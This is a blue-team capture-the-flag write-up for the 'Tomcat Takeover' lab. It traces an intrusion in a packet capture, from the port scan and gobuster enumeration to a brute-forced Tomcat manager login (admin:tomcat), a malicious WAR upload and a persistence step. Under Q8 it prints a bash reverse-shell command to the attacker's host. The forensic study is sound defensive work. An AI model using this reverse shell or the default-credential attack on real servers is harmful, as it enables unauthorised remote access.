---
title: "Write-up: Tomcat Takeover"
date: 2026-05-13 10:00:00 +0200
categories: [Writeups, BlueTeam]
tags: [c2, forensics, intel]
image:
  path: /assets/img/tomcat-takeover.png
---

[Tomcat Takeover Lab](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/)

## Scenario
The SOC team has discovered suspicious activity on a web server within the company's intranet, lets investigate.

## Tools used

- [ ] Wireshark
- [ ] NetworkMiner
- [ ] AbuseIPDB

## Solution

### Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

So, lets begin by opening the pcap file on Wireshark

![Image](/assets/img/p58.png)

Now for the first answer if we scroll down we will notice weird moves on the TCP Stream which tells us the IP we are looking for

![Image](/assets/img/p59.png)

`14.0.0.120`

### Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

Just go to [AbuseIPDB](https://www.abuseipdb.com/check/14.0.0.120)

![Image](/assets/img/p60.png)

`China`

### Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

If we scroll down to the end of the scan we will see the port that gave him the access 

![Image](/assets/img/p61.png)

`8080`

### Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

If we notice here hes enumerating our directories, that gives us the hint that we need

![Image](/assets/img/p62.png)


`gobuster`

### Q5: After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

If we look closer here we can notice he got the port that gave he admin before 

![Image](/assets/img/p63.png)

`/manager`

### Q6: After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

So, for this one lets filter HTTP and POST

![Image](/assets/img/p64.png)

Now just double click it and scroll in details, u will see the answer

![Image](/assets/img/p65.png)

`admin:tomcat`

### Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?


For this one just scroll down a bit more on details

![Image](/assets/img/p66.png)

`JXQOZY.war`

### Q8: After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

For this one just search 'ip.src == 14.0.0.120 && tcp.flags == 0x012' follow on TCP and that should be it

![Image](assets/img/p67.png)

`/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`


# And thats it, Tomcat Takeover Completed!
